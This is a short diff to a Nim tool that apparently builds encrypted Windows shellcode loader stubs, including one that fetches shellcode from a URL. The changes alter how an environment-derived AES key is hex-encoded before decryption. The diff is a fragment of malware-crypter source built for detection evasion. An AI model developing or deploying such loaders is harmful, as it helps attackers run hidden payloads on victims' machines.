@@ -14,6 +14,7 @@ import osproc
 import docopt
 import random
 import winim
+#import std/algorithm
 import streams
 when system.hostOS == "windows":
     import winim/clr except `[]`
@@ -863,7 +864,9 @@ echo "[*] Plaintext length: " & $len(plaintext)
 echo "[*] Enctext length: " & $len(enctext)
 
 # Convert Key to byte sequence
-var expandedkey = toByteSeq(envkey)
+#envkey = reverse(envkey)
+var expandedkey = toByteSeq(toHex(envkey))
+#expandedkey = toOpenArray(expandedkey).reverse()
 
 
 # AES256 key size is 256 bits or 32 bytes, so we need to pad key with
@@ -1460,6 +1463,7 @@ let ShellcodeFromURLStub * = fmt"""
 
 let Cryptstub1 = """
 import winim/lean
+#import std/algorithm
 import strformat
 from nimcrypto import ECB, aes256, sizeKey, sizeBlock, sha256, digest, init, update, finish, clear, decrypt, encrypt
 import strutils
@@ -1741,7 +1745,9 @@ let Cryptstub3 = fmt"""
     #var envkey2 = envkey & "{lastfour}"
     
     proc decryptLate(): void =
-        var expandedkey = toByteSeq(envkey2)
+        #envkey2 = reverse(envkey2)
+        var expandedkey = toByteSeq(toHex(envkey2))
+        #expandedkey = toOpenArray(expandedkey).reverse()
         discard calcHard()
         if ((int(len(expandedkey)) mod int(aes256.sizeBlock)) != 0):
             when defined(verbose):
